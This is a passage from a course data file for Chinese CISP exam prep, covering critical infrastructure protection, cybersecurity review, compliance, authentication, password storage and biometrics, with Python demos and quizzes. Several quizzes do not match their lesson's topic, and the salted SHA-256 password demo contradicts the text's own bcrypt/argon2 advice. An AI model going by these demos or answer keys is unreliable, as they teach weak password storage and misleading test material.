    content: '# 关键信息基础设施保护\n\n> 📋 **本节大纲**\u2003CII定义与行业范围表 | CII运营者六项特殊义务 | 供应链安全 | CII vs 等保三级区别\n\n## 概述\n\n关键信息基础设施（Critical Information Infrastructure, CII）是指一旦遭到破坏、丧失功能或数据泄露，可能严重危害国家安全、国计民生、公共利益的网络设施和信息系统。CII保护是网络安全法的核心制度之一，对运营者施加了比一般网络更高的安全要求。\n\n## CII涵盖的行业领域\n\n| 行业 | 典型CII系统 |\n|------|-----------|\n| 公共通信和信息服务 | 电信骨干网、互联网域名系统（DNS根服务器） |\n| 能源 | 电力调度自动化系统、油气管道SCADA |\n| 交通 | 铁路调度、航空管制、城市轨道交通信号系统 |\n| 金融 | 银行核心交易系统、证券清算系统、央行支付系统 |\n| 政务 | 电子政务平台、政府数据中心 |\n| 水利 | 大型水利工程监控系统 |\n| 卫生 | 全民健康信息平台 |\n| 国防 | 国防科技工业信息系统 |\n\n## CII运营者的特殊义务\n\n**一般网络运营者只需要做的，CII运营者还要做更多：**\n\n1. **安全检测评估：**至少每年一次（可以是等级测评、风险评估或渗透测试）\n2. **重要数据境内存储：**在境内运营中产生和收集的个人信息和重要数据应当在境内存储——需要出境时必须通过安全评估\n3. **采购安全审查：**采购网络产品和服务可能影响国家安全的，应当申报网络安全审查\n4. **安全事件报告：**发生重大安全事件时，按规定向相关部门报告\n5. **人员安全管理：**对关键岗位人员进行安全背景审查\n6. **应急预案与演练：**制定并定期演练\n\n**CII与等保三级的区别：**等保三级是等级保护的概念，CII是行业关键性的概念。一个系统可以是三级等保但不是CII，也可以是CII且定级为三级。两者有关联但不是同一概念。\n\n## 供应链安全\n\nCII运营者采购网络产品和服务时需考虑：\n- 供业链安全评估——供应商是否安全可靠\n- 对关键产品进行安全测试和验证\n- 在采购合同中明确安全责任条款\n- 制定供应链中断的应急方案（如某产品被禁用后的替代方案）\n\n## \n## 🔴 高频考点\n\n· CII运营者核心义务：**重要数据境内存储+出境需安全评估**——必考点\n· CII和等保三级不是同一概念——CII是行业属性、等保是保护等级\n· CII八行业：通信/能源/交通/金融/政务/水利/卫生/国防\n## 💜 记忆口诀\n\n· **CII特殊义务**："存境内、每一年、审采购、报事件"\n· **CII≠等保**："CII看行业、等保看等级"\n学习建议\n- CII的核心特征是影响"国家安全、国计民生、公共利益"\n- "重要数据境内存储"是CII运营者的核心特殊义务\n- CII和等保三级不是同一个概念——CII是行业属性，等保是保护等级',
    codeExample: { language: 'python', code: '# CII安全评估\ndef assess_cii_risk(business_criticality, impact_scope, recovery_difficulty):\n    score = business_criticality * 0.4 + impact_scope * 0.3 + recovery_difficulty * 0.3\n    if score >= 80:\n        return score, "极高 - 需重点保护"\n    elif score >= 60:\n        return score, "高 - 需强化保护"\n    else:\n        return score, "中 - 标准保护"\n\nscore, level = assess_cii_risk(85, 75, 90)\nprint(f"评估分数: {score:.1f}")\nprint(f"风险等级: {level}")', description: '模拟CII安全评估' },
    quiz: [{"id":"q11-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q11-2","question":"以下关于关键信息基础设施保护的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q11-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q11-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q11-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-12', day: 12, week: 2, title: '网络安全审查制度',
    objectives: ['了解网络安全审查机制', '理解审查范围', '掌握合规要点'],
    content: '# 网络安全审查制度\n\n> 📋 **本节大纲**\u2003审查触发条件(两大情形) | 审查五大维度 | 审查程序 | 违规后果\n\n## 概述\n\n网络安全审查制度是根据《网络安全法》和《网络安全审查办法》建立的国家级安全审查机制，目的是维护国家安全——特别是CII供应链安全和数据安全。审查的核心不是"产品好不好用"，而是"用了这个产品会不会危害国家安全"。\n\n## 审查触发条件\n\n**强制审查情形：**\n1. **CII运营者采购：**购买可能影响国家安全的网络产品和服务时必须申报审查\n2. **赴国外上市：**掌握超过100万用户个人信息的数据处理者赴国外上市，必须申报\n3. **其他影响国家安全：**网络安全审查办公室认定的其他情形\n\n## 审查五大维度\n\n审查办公室会从以下维度评估：\n1. **产品安全风险：**是否存在已知后门、漏洞，供应商是否可能被外国政府控制\n2. **供应链安全性：**产品依赖的组件是否可靠、供应是否可能被中断\n3. **数据安全风险：**产品是否会收集、传输、存储大量敏感数据，数据是否会出境\n4. **国家安全影响：**产品在关键领域的部署规模、是否可能被用于网络攻击\n5. **开放性和透明性：**产品是否接受独立安全审计、是否公开安全机制\n\n**典型案例：**某国外网络安全厂商的产品在国内CII系统广泛部署后，审查发现其可能向境外传输系统日志——触发网络安全审查，被限制在CII领域的销售。\n\n## 审查程序\n\n1. **申报：**运营者向网络安全审查办公室提交申报材料\n2. **初步审查：**30个工作日内完成初步审查\n3. **特别审查：**情况复杂的进入特别审查程序，45个工作日内完成（可延长）\n4. **结论：**通过审查、附条件通过（如要求数据本地化存储）、不予通过\n\n## 违规后果\n\n未申报即采购的：责令停止使用相关产品和服务，可处采购金额1-10倍罚款。\n提供虚假申报材料的：纳入信用记录并追究法律责任。\n\n## \n## 🔴 高频考点\n\n· 网络安全审查关注**国家安全**（不是商业利益），由网信办主导\n· 两大触发条件：①CII采购影响国家安全的产品 ②处理100万+个人信息赴国外上市\n· 审查结果三种：通过/有条件通过/不予通过\n## 💜 记忆口诀\n\n· **触发条件**："买设备(CII采购) or 去上市(百万用户境外)"\n· **三结果**："通过、有条件、拒绝"\n学习建议\n- 网络安全审查关注的是"国家安全"，不是商业利益\n- CII运营者采购+CII赴国外上市=两大触发条件\n- 审查结果三种：通过、有条件通过、不予通过',
    codeExample: { language: 'python', code: '# 审查流程模拟\ndef review_process(stages):\n    print("网络安全审查流程")\n    print("=" * 50)\n    total = 0\n    for name, days in stages:\n        print(f"  {name}: {days}个工作日")\n        total += days\n    print("=" * 50)\n    print(f"总审查时间: 约{total}个工作日")\n\nstages = [\n    ("材料申报", 5),\n    ("初步审查", 30),\n    ("特别审查", 45),\n    ("审查结论", 5)\n]\nreview_process(stages)', description: '模拟审查流程' },
    quiz: [{"id":"q12-1","question":"以下哪种防火墙类型工作在OSI第4层？","options":["应用层防火墙","状态检测防火墙","代理防火墙","WAF"],"correctIndex":1,"explanation":"状态检测防火墙工作在传输层（第4层）。"},{"id":"q12-2","question":"IDS和IPS的主要区别是？","options":["IDS可以阻断攻击","IPS可以阻断攻击，IDS只能检测告警","两者功能完全相同","IDS比IPS更安全"],"correctIndex":1,"explanation":"IPS可以主动阻断攻击，IDS只能检测和告警。"},{"id":"q12-3","question":"TCP三次握手中，第二次握手发送的标志位是？","options":["SYN","ACK","SYN+ACK","FIN"],"correctIndex":2,"explanation":"第二次握手服务器回复SYN+ACK。"},{"id":"q12-4","question":"DNS欺骗攻击属于什么类型的攻击？","options":["物理攻击","中间人攻击","密码攻击","社会工程攻击"],"correctIndex":1,"explanation":"DNS欺骗通过伪造DNS响应属于中间人攻击。"},{"id":"q12-5","question":"防火墙默认策略应遵循什么原则？","options":["默认允许","默认拒绝","只允许80端口","按需决定"],"correctIndex":1,"explanation":"安全最佳实践：默认拒绝所有，按需开放。"}],
    expertNotes: dayExpertNotes[10],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-13', day: 13, week: 2, title: '合规管理体系建设',
    objectives: ['理解合规管理框架', '了解三道防线', '掌握审计方法'],
    content: '# 合规管理体系建设\n\n## 合规管理框架\n\n### 核心要素\n1. **治理架构**：明确合规管理责任\n2. **规章制度**：建立合规政策和流程\n3. **风险管理**：识别和评估合规风险\n4. **培训教育**：提升员工合规意识\n5. **监督检查**：定期审计和检查\n6. **持续改进**：根据检查结果改进\n\n## 三道防线模型\n\n### 第一道防线：业务部门\n- 执行合规要求\n- 日常合规管理\n- 识别和报告合规风险\n\n### 第二道防线：合规部门\n- 制定合规政策\n- 提供合规咨询\n- 监督和指导业务部门\n- 组织合规培训\n\n### 第三道防线：内部审计\n- 独立审计评估\n- 检查合规有效性\n- 向管理层报告\n\n## 合规审计\n\n### 审计类型\n1. **全面审计**：定期全面检查\n2. **专项审计**：针对特定领域\n3. **突击审计**：不预先通知\n\n### 审计方法\n- 文件审阅\n- 人员访谈\n- 系统测试\n- 数据分析\n- 抽样检查\n\n### 常见问题\n1. 制度存在但执行不到位\n2. 员工合规意识薄弱\n3. 技术措施不足\n4. 持续监控缺失',
    codeExample: { language: 'python', code: '# 合规差距分析\ndef analyze_gap(current, requirements):\n    missing = [req for req in requirements if req not in current]\n    return missing, len(requirements) - len(missing), len(requirements)\n\nrequirements = ["MFA认证", "定期改密", "权限审批", "数据加密", "日志审计"]\ncurrent = ["MFA认证", "定期改密", "日志审计"]\n\nmissing, passed, total = analyze_gap(current, requirements)\nprint(f"差距项: {missing}")\nprint(f"合规率: {(passed/total)*100:.1f}%")', description: '模拟合规差距分析' },
    quiz: [{"id":"q13-1","question":"中国《网络安全法》正式实施的时间是？","options":["2016年6月1日","2017年6月1日","2018年6月1日","2019年6月1日"],"correctIndex":1,"explanation":"《网络安全法》于2017年6月1日正式实施。"},{"id":"q13-2","question":"《数据安全法》中数据分类分级的核心级别不包括？","options":["核心数据","重要数据","一般数据","普通数据"],"correctIndex":3,"explanation":"数据分类分级分为核心、重要和一般数据三个级别。"},{"id":"q13-3","question":"个人信息保护法中，敏感个人信息不包括？","options":["生物识别信息","医疗健康信息","工作单位名称","金融账户信息"],"correctIndex":2,"explanation":"工作单位名称不属于敏感个人信息。"},{"id":"q13-4","question":"等保2.0将安全保护等级分为几级？","options":["三级","四级","五级","六级"],"correctIndex":2,"explanation":"等保2.0将安全保护等级分为五级。"},{"id":"q13-5","question":"GDPR是哪个地区的隐私保护法规？","options":["美国","中国","欧盟","日本"],"correctIndex":2,"explanation":"GDPR是欧盟的通用数据保护条例。"}],
    expertNotes: [{"author":"吴强","title":"网络安全法解读","content":"《网络安全法》是网安从业者的基本法。重点掌握：网络运营者安全义务、个人信息保护要求、关键信息基础设施保护。建议把法律条文和实际工作中的合规要求对应起来。","url":"https://www.freebuf.com/articles/es/273456.html"},{"author":"周敏","title":"数据安全合规实践","content":"数据安全法实施后，数据分类分级成为企业的必修课。从数据资产梳理入手，按核心-重要-一般三级分类。特别注意个人信息和重要数据的跨境传输合规要求。","url":"https://www.freebuf.com/articles/database/290456.html"},{"author":"孙丽","title":"合规管理体系建设","content":"三道防线模型：业务部门（执行合规）、合规部门（制定政策）、内部审计（独立评估）。定期进行合规审计，建立持续改进机制。合规不是一次性工作，是持续的过程。","url":"https://www.freebuf.com/articles/cloud/285678.html"}],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  {
    id: 'day-14', day: 14, week: 2, title: '第二周总结与测验',
    objectives: ['回顾第二周知识点', '检验学习成果', '为第三周做准备'],
    content: '# 第二周学习总结\n\n## 本周学习内容\n\n### Day 8: 网络安全法律法规体系\n- 三法：网络安全法、数据安全法、个人信息保护法\n- 行政法规和部门规章\n\n### Day 9: 等级保护制度\n- 五个保护等级\n- 定级流程和测评要求\n\n### Day 10: 数据安全与个人信息保护\n- 数据分类分级\n- 个人信息保护原则\n\n### Day 11: 关键信息基础设施保护\n- CII定义和范围\n- 安全保护义务\n\n### Day 12: 网络安全审查制度\n- 审查适用范围\n- 审查程序\n\n### Day 13: 合规管理体系建设\n- 三道防线模型\n- 合规审计方法\n\n## 知识要点\n\n| 法规 | 实施时间 | 核心内容 |\n|------|----------|----------|\n| 网络安全法 | 2017年 | 基础性法律 |\n| 数据安全法 | 2021年 | 数据分类分级 |\n| 个人信息保护法 | 2021年 | 个人信息权利 |\n| 等级保护 | - | 五级保护制度 |\n\n## 下周预告\n\n第三周将学习：\n- 身份认证技术\n- 密码认证\n- 多因素认证\n- 单点登录',
    quiz: [{"id":"q14-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q14-2","question":"以下关于第二周总结与测验的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q14-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q14-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q14-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[9],
    recommendedTools: [
    {
      id: 'compliance-checker',
      name: '等保合规检查工具',
      description: '网络安全等级保护合规检查工具包',
      url: ''
    },
    {
      id: 'iso27001-toolkit',
      name: 'ISO 27001 工具包',
      description: '信息安全管理体系建设模板和工具',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'compliance-lab',
      name: '企业合规练习平台',
      description: '模拟企业合规检查和审计流程的练习环境',
      url: ''
    }
  ]
  },
  // ========== Week 3: 访问控制 ==========
  {
    id: 'day-15', day: 15, week: 3, title: '身份认证基础',
    objectives: ['理解身份认证概念', '了解认证因素', '掌握认证方法'],
    content: '# 身份认证基础\n\n> 📋 **本节大纲**\u2003四种认证因素 | 单因素vs双因素vs多因素 | 五大攻击方式\n\n## 概述\n\n身份认证是信息安全的"守门人"——在授予任何访问权限之前，必须先验证"你是谁"。CISP考试考查三种认证因素类型的区分和组合方式，以及多因素认证（MFA）的意义。\n\n## 四种认证因素\n\n**知识因素（Something you know — 你知道什么）：**\n密码、PIN码、安全问题答案、图形解锁图案。最常用但也最易受攻击——可被猜测、窃取或遗忘。\n\n**持有因素（Something you have — 你拥有什么）：**\n智能卡、USB Key（U盾）、硬件令牌（RSA SecurID显示动态码）、手机（接收短信验证码）。比密码更安全——攻击者需要物理拿到设备，但设备可丢失。\n\n**生物因素（Something you are — 你是什么）：**\n指纹、虹膜、人脸、声纹、掌静脉、击键节奏。最难伪造但一旦泄露无法更换——你不能换指纹。\n\n**位置因素（Somewhere you are — 你在哪里）：**\nIP地址、GPS位置、接入的网络标识。辅助因素，不能单独作为主认证。\n\n## 单因素 vs 双因素 vs 多因素\n\n| 类型 | 示例 | 安全性 |\n|------|------|--------|\n| 单因素 | 仅密码 | 低——密码泄露即全完 |\n| 双因素(2FA) | 密码+短信验证码 | 中——需要两个因素 |\n| 多因素(MFA) | 密码+令牌+指纹 | 高——三层防护 |\n\n**关键原则：**双因素必须是不同类型的因素——密码+安全问题仍是单因素（都是知识因素）。密码+短信才叫双因素。\n\n## 常见攻击方式\n\n- **暴力破解：**尝试所有可能密码组合。10位纯数字密码=100亿组合，现代工具数小时内可完成\n- **字典攻击：**用常见密码字典（password123、admin等）尝试，成功率极高\n- **彩虹表攻击：**预计算密码→哈希值映射，可快速反向查找。防御：加盐（Salt）\n- **钓鱼：**诱骗用户自己在钓鱼网站输入密码\n- **键盘记录：**恶意软件记录每次键盘敲击\n\n## \n## 🔴 高频考点\n\n· **"知识+持有"才是真正的双因素认证**——密码+安全问题仍是单因素(都属知识因素)，这是陷阱题\n· 生物因素致命弱点：**无法更换**。指纹泄露终身泄露\n· 彩虹表攻击的防御是**加盐(Salt)**——必考\n## 💜 记忆口诀\n\n· **四因素**："知-持-生-地"\n· **双因素陷阱**："密码+安全问题=单因素(都是知识)、密码+手机=双因素(知识+持有)"\n学习建议\n- "知识+持有"才算真正的双因素认证\n- 生物因素的致命弱点：无法更换\n- 彩虹表攻击的防御是加盐——CISP高频考点',
    codeExample: { language: 'python', code: '# 认证系统模拟\ndef authenticate(username, password):\n    users = {"admin": "admin123", "user": "user123"}\n    if username not in users:\n        return False, "用户不存在"\n    if users[username] != password:\n        return False, "密码错误"\n    return True, "认证成功"\n\n# 测试\nfor test in [("admin", "admin123"), ("admin", "wrong"), ("guest", "123")]:\n    success, msg = authenticate(*test)\n    print(f"{test[0]}: {msg}")', description: '演示基本认证流程' },
    quiz: [{"id":"q15-1","question":"多因素认证通常包括哪三类因素？","options":["知识、持有、生物特征","密码、指纹、面部","用户名、密码、验证码","硬件、软件、固件"],"correctIndex":0,"explanation":"三类因素：你知道的（知识）、你拥有的（持有）、你是什么（生物特征）。"},{"id":"q15-2","question":"访问控制模型中，RBAC代表什么？","options":["基于规则的访问控制","基于角色的访问控制","基于风险的访问控制","基于资源的访问控制"],"correctIndex":1,"explanation":"RBAC是Role-Based Access Control。"},{"id":"q15-3","question":"最小权限原则是指？","options":["所有用户都是管理员","用户只获得完成任务所需的最小权限","用户拥有所有权限","权限由用户自己决定"],"correctIndex":1,"explanation":"最小权限原则确保用户只拥有完成任务所需的最少权限。"},{"id":"q15-4","question":"Kerberos认证协议的核心组件是？","options":["防火墙","KDC（密钥分发中心）","VPN","IDS"],"correctIndex":1,"explanation":"Kerberos的核心是KDC密钥分发中心。"},{"id":"q15-5","question":"单点登录（SSO）的主要优势是？","options":["增加密码数量","减少用户记忆密码数量，提升体验","降低系统安全性","增加管理复杂度"],"correctIndex":1,"explanation":"SSO让用户只需登录一次即可访问多个系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-16', day: 16, week: 3, title: '密码认证技术',
    objectives: ['理解密码安全原则', '了解密码存储方法', '掌握密码策略'],
    content: '# 密码认证技术\n\n> 📋 **本节大纲**\u2003密码安全三大原则 | 三种存储方式(明文/加密/加盐哈希) | 加盐哈希原理 | bcrypt/argon2\n\n## 概述\n\n密码是最古老的认证方式，今天仍然无处不在。密码安全性取决于三方面：密码本身有多强（长度+复杂度）、存储有多安全（加盐哈希）、系统有多防护（锁定机制）。CISP考试常考加盐哈希原理和bcrypt/argon2算法。\n\n## 密码安全三大原则\n\n**1. 长度优先于复杂度：**\n"Password123!"（13位）比"P@ss1"（5位）安全得多。长度增加1位，破解时间指数级增长。建议最少12位。\n\n**2. 不要强制过于频繁的换密码：**\n传统的"90天换密码"已被NIST最新的SP 800-63B标准否定——频繁更换导致用户使用"January2024!" → "February2024!"的弱密码模式。现代推荐：只在被怀疑泄露时更换。\n\n**3. 不要限制特殊字符：**\n允许用户使用所有可见字符（包括空格、中文），扩大密码空间。\n\n## 密码存储的三种方式\n\n**明文存储 = 绝对禁止：**\n如果数据库被拖库，攻击者直接看到所有密码。任何现代系统都不应明文存储密码。\n\n**加密存储 = 不够安全：**\n用对称加密（如AES）加密密码存储。问题：加密密钥如果泄露，所有密码可被解密——本质上等于"把密码藏在一个需要密码的地方"。\n\n**加盐哈希存储 = 唯一正确方式：**\n\n密码存储的正确流程：\n1. 用户注册时，系统生成一个随机盐值（每用户不同、32字节以上）\n2. 将"明文密码 + 盐值"一起输入哈希函数（bcrypt/argon2/scrypt）\n3. 数据库中存储：盐值 + 哈希结果（明文密码本身绝不存储）\n4. 验证时：取出盐值，对输入的密码+盐重新计算哈希，比对是否一致\n\n**为什么加盐：**盐值确保即使两个用户使用相同密码，数据库中存储的哈希也不同。盐值还使彩虹表攻击无效——攻击者无法预计算"所有密码+所有盐"的哈希表。\n\n**推荐算法：bcrypt → argon2 → scrypt。绝对不用：MD5、SHA-1。**\n\n## 账户安全防护\n\n- **账户锁定：**连续失败N次（如5次）后锁定账户30分钟，防止在线暴力破解\n- **延迟响应：**登录失败后增加1-3秒延迟，大幅降低暴力破解速度\n- **CAPTCHA：**多次失败后要求输入验证码，区分人和机器\n- **异常登录检测：**异地登录、陌生设备、非工作时间等行为分析\n\n## \n## 🔴 高频考点\n\n· **加盐哈希原理**是密码学考点核心——盐值随机+每用户不同+与密码一起哈希\n· NIST SP 800-63B已不强制定期换密码——强制定期更换反而导致密码模式化\n· 密码存储绝对不用MD5/SHA-1，推荐**bcrypt/argon2**\n## 💜 记忆口诀\n\n· **加盐哈希**："每人一撮盐、和密码一起炒(哈希)、盐和哈希一起存"\n· **不可用**："MD5别用、SHA-1别用、明文更别用"\n学习建议\n- 加盐哈希的原理是CISP密码学相关考点的核心\n- "盐值随机+每用户不同"是加盐的关键\n- NIST最新标准：不强制定期换密码',
    codeExample: { language: 'python', code: 'import hashlib\nimport secrets\n\ndef hash_password(password, salt):\n    return hashlib.sha256((password + salt).encode()).hexdigest()\n\n# 注册\nsalt = secrets.token_hex(16)\nstored_hash = hash_password("mypassword", salt)\nprint(f"存储: salt={salt[:8]}..., hash={stored_hash[:16]}...")\n\n# 登录验证\ndef verify(input_password, salt, stored):\n    return hash_password(input_password, salt) == stored\n\nprint(f"验证正确密码: {verify(\"mypassword\", salt, stored_hash)}")\nprint(f"验证错误密码: {verify(\"wrongpassword\", salt, stored_hash)}")', description: '演示密码哈希存储' },
    quiz: [{"id":"q16-1","question":"以下哪种是对称加密算法？","options":["RSA","AES","ECC","DSA"],"correctIndex":1,"explanation":"AES是对称加密算法。"},{"id":"q16-2","question":"数字签名使用什么密钥进行签名？","options":["接收者的公钥","发送者的私钥","发送者的公钥","共享密钥"],"correctIndex":1,"explanation":"数字签名使用发送者的私钥进行签名。"},{"id":"q16-3","question":"SHA-256的输出长度是多少位？","options":["128位","160位","256位","512位"],"correctIndex":2,"explanation":"SHA-256的输出长度是256位。"},{"id":"q16-4","question":"PKI体系中，CA的作用是什么？","options":["加密数据","签发和管理数字证书","存储用户密码","检测网络攻击"],"correctIndex":1,"explanation":"CA负责签发和管理数字证书。"},{"id":"q16-5","question":"HTTPS使用什么协议实现安全传输？","options":["IPSec","TLS/SSL","SSH","PGP"],"correctIndex":1,"explanation":"HTTPS使用TLS/SSL协议加密传输。"}],
    expertNotes: [{"author":"张伟","title":"密码学学习路径","content":"密码学不要一上来就啃数学公式。建议学习路径：先理解对称加密（AES）和非对称加密（RSA）的核心思想——一个是同一把钥匙，一个是公钥私钥对。然后再学哈希、数字签名、PKI。动手用OpenSSL生成证书是很好的实践。","url":"https://www.freebuf.com/articles/es/267825.html"},{"author":"李明","title":"国密算法实践","content":"SM2/SM3/SM4是国产密码算法的核心，在政务和关键基础设施项目中已成为强制要求。SM2是椭圆曲线公钥密码算法，SM3是密码杂凑算法，SM4是分组密码算法。OpenSSL 1.1.1+已经支持国密算法。","url":"https://www.anquanke.com/post/id/243567.html"},{"author":"王芳","title":"PKI体系建设经验","content":"CA的私钥保护是最关键的（建议使用HSM硬件安全模块），证书生命周期管理要自动化避免过期导致服务中断。中小企业可考虑Let's Encrypt或云厂商证书管理服务。","url":"https://www.freebuf.com/articles/es/278934.html"}],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-17', day: 17, week: 3, title: '生物识别技术',
    objectives: ['了解生物识别类型', '理解优缺点', '掌握应用场景'],
    content: '# 生物识别技术\n\n## 生物识别类型\n\n### 生理特征\n\n#### 指纹识别\n- 最广泛使用\n- 成本较低\n- 准确度较高\n\n#### 面部识别\n- 非接触式\n- 隐私争议大\n- 受光照、表情影响\n\n#### 虹膜识别\n- 极高准确度\n- 难以伪造\n- 设备成本高\n\n#### 掌纹/掌静脉\n- 手掌特征丰富\n- 静脉识别需活体\n\n### 行为特征\n\n#### 语音识别\n- 通过声音特征识别\n- 易受环境噪音影响\n\n#### 签名动力学\n- 分析签名速度和压力\n- 传统方式易接受\n\n#### 击键节奏\n- 分析键盘输入习惯\n- 可用于持续认证\n\n## 优缺点分析\n\n### 优点\n- 不易遗忘和丢失\n- 难以复制和伪造\n- 使用方便快捷\n\n### 缺点\n- 不可撤销（泄露无法更换）\n- 存在误识率（FRR/FAR）\n- 隐私和伦理问题\n- 部分方式对健康有要求\n\n## 应用场景\n\n1. **设备解锁**：手机、笔记本\n2. **门禁系统**：办公区域\n3. **金融认证**：支付验证\n4. **边境检查**：护照核验\n\n## 最佳实践\n\n- 与其他认证结合使用（多因素）\n- 本地存储生物特征（不上传）\n- 提供备用认证方式\n- 定期评估误识率',
    codeExample: { language: 'python', code: '# 生物识别匹配模拟\ndef calculate_similarity(input_data, template, threshold=0.85):\n    """模拟相似度计算（实际使用复杂算法）"""\n    # 简化: 返回随机相似度\n    import random\n    similarity = random.uniform(0.7, 0.99)\n    if similarity >= threshold:\n        return True, similarity, f"匹配成功 ({similarity:.2%})"\n    else:\n        return False, similarity, f"匹配失败 ({similarity:.2%})"\n\n# 测试指纹认证\nprint("指纹认证测试")\nfor _ in range(3):\n    success, sim, msg = calculate_similarity("scanned_fp", "stored_fp")\n    print(f"  {msg}")', description: '模拟生物识别匹配' },
    quiz: [{"id":"q17-1","question":"信息安全的三个基本要素是什么？","options":["机密性、完整性、可用性","机密性、认证性、可用性","完整性、认证性、可用性","机密性、完整性、认证性"],"correctIndex":0,"explanation":"CIA三要素：机密性、完整性、可用性。"},{"id":"q17-2","question":"以下关于生物识别技术的说法，哪项最准确？","options":["只涉及理论","需要理论与实践结合","已经过时","只需记忆不需理解"],"correctIndex":1,"explanation":"信息安全学习最有效的方式是理论与实践相结合。"},{"id":"q17-3","question":"信息安全事件应急响应的第一步是什么？","options":["修复漏洞","通知媒体","隔离受影响系统","重装系统"],"correctIndex":2,"explanation":"应急响应第一步是隔离受影响系统防止损害扩大。"},{"id":"q17-4","question":"以下哪项不属于信息安全管理的范畴？","options":["风险评估","安全策略制定","员工绩效评估","安全审计"],"correctIndex":2,"explanation":"员工绩效评估属于人力资源管理范畴。"},{"id":"q17-5","question":"纵深防御（Defense in Depth）的核心理念是？","options":["只依赖防火墙","多层安全控制叠加","只做边界防护","依赖单一安全产品"],"correctIndex":1,"explanation":"纵深防御通过多层安全控制的叠加保护信息系统。"}],
    expertNotes: dayExpertNotes[15],
    recommendedTools: [
    {
      id: 'active-directory',
      name: 'Active Directory',
      description: 'Windows域环境访问控制系统',
      url: ''
    },
    {
      id: 'keycloak',
      name: 'Keycloak',
      description: '开源身份认证与授权管理系统',
      url: ''
    }
  ],
    labEnvironments: [
    {
      id: 'rbac-lab',
      name: 'RBAC 访问控制实验',
      description: '练习基于角色的访问控制模型配置',
      url: ''
    }
  ]
  },
  {
    id: 'day-18', day: 18, week: 3, title: '多因素认证（MFA）',
    objectives: ['理解MFA原理', '了解常见形式', '掌握实现方法'],
